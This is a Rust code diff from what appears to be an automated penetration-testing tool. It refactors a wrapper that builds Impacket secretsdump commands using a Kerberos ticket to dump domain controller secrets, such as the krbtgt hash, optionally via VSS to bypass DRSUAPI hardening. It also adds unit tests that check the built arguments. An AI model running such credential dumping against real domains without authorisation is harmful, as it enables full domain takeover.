@@ -317,6 +317,11 @@ pub async fn ssh_with_password(args: &Value) -> Result<ToolOutput> {
 ///                `just_dc_user` (single account, e.g. `krbtgt`),
 ///                `use_vss` (bool — use VSS method to bypass DRSUAPI hardening)
 pub async fn secretsdump_kerberos(args: &Value) -> Result<ToolOutput> {
+    build_secretsdump_kerberos(args)?.execute().await
+}
+
+#[doc(hidden)]
+pub fn build_secretsdump_kerberos(args: &Value) -> Result<CommandBuilder> {
     let target = required_str(args, "target")?;
     let username = required_str(args, "username")?;
     let domain = required_str(args, "domain")?;
@@ -344,7 +349,7 @@ pub async fn secretsdump_kerberos(args: &Value) -> Result<ToolOutput> {
         cmd = cmd.arg("-use-vss");
     }
 
-    cmd.timeout_secs(timeout_secs).execute().await
+    Ok(cmd.timeout_secs(timeout_secs))
 }
 
 #[cfg(test)]
@@ -849,6 +854,57 @@ mod tests {
             "domain": "contoso.local"
         });
         assert!(required_str(&args, "ticket_path").is_err());
+    }
+
+    #[test]
+    fn secretsdump_kerberos_argv_carries_the_ccache_into_impacket() {
+        let cmd = super::build_secretsdump_kerberos(&json!({
+            "target": "dc01.contoso.local",
+            "username": "dc01$",
+            "domain": "contoso.local",
+            "ticket_path": "/tmp/ares-tickets/dc01$@contoso.local.ccache",
+            "dc_ip": "192.168.58.10",
+            "target_ip": "192.168.58.10",
+            "just_dc_user": "krbtgt",
+            "use_vss": true
+        }))
+        .expect("build");
+        let argv = cmd.args_for_test();
+        assert!(argv.iter().any(|a| a == "-k"), "{argv:?}");
+        assert!(argv.iter().any(|a| a == "-no-pass"), "{argv:?}");
+        assert!(argv.iter().any(|a| a == "-use-vss"), "{argv:?}");
+        assert!(
+            argv.iter()
+                .any(|a| a == "contoso.local/dc01$@dc01.contoso.local"),
+            "{argv:?}"
+        );
+        for pair in [
+            ["-dc-ip", "192.168.58.10"],
+            ["-target-ip", "192.168.58.10"],
+            ["-just-dc-user", "krbtgt"],
+        ] {
+            assert!(argv.windows(2).any(|w| w == pair), "{pair:?} in {argv:?}");
+        }
+        assert_eq!(
+            cmd.env_vars_for_test(),
+            &[(
+                "KRB5CCNAME".to_string(),
+                "/tmp/ares-tickets/dc01$@contoso.local.ccache".to_string()
+            )]
+        );
+    }
+
+    #[test]
+    fn secretsdump_kerberos_without_a_ticket_never_builds_an_argv() {
+        let built = super::build_secretsdump_kerberos(&json!({
+            "target": "dc01.contoso.local",
+            "username": "dc01$",
+            "domain": "contoso.local"
+        }));
+        let Err(err) = built else {
+            panic!("no ccache means no dump")
+        };
+        assert!(err.to_string().contains("ticket_path"), "{err}");
     }
 
     // --- mock executor tests ---
